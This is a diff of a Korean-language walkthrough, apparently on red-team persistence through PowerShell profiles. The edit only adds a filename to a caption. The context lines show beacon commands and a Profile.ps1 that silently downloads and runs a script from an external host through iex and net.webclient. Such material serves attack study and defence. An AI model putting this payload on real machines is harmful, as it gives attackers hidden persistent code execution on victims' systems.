@@ -100,7 +100,7 @@ beacon> mkdir C:\Users\pchilds\Documents\WindowsPowerShell
 beacon> cd C:\Users\pchilds\Documents\WindowsPowerShell
 ```
 
-외부 URL로 부터 파일을 다운로드하여 실행 시키는 프로필 파일 생성
+외부 URL로 부터 파일을 다운로드하여 실행 시키는 프로필 파일(Profile.ps1) 생성
 ``` powershell
 # Profile.ps1
 $_ = Start-Job -ScriptBlock { iex (new-object net.webclient).downloadstring("http://bleepincomputer.com/a") }
